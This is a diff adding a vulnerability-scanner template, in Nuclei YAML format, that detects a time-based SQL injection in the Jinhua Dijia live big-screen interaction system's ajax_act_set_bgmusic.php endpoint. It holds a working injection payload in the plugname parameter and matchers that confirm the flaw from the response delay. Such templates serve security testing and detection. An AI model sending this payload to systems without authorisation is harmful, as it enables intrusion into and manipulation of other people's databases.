@@ -1,0 +1,31 @@
+id: poc-yaml-deejia-ajax-act-set-bgmusic-sqli
+info:
+  name: 金华迪加现场大屏互动系统 ajax_act_set_bgmusic SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    金华迪加现场大屏互动系统存在SQL注入漏洞，攻击者可以利用该漏洞进行SQL注入攻击。
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /wall/ajax_act_set_bgmusic.php?bgmusicstatus=1&plugname=%22XOR(if(now()=sysdate(),SLEEP({{t1}}),0))XOR%22Z HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"ret":1}'
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
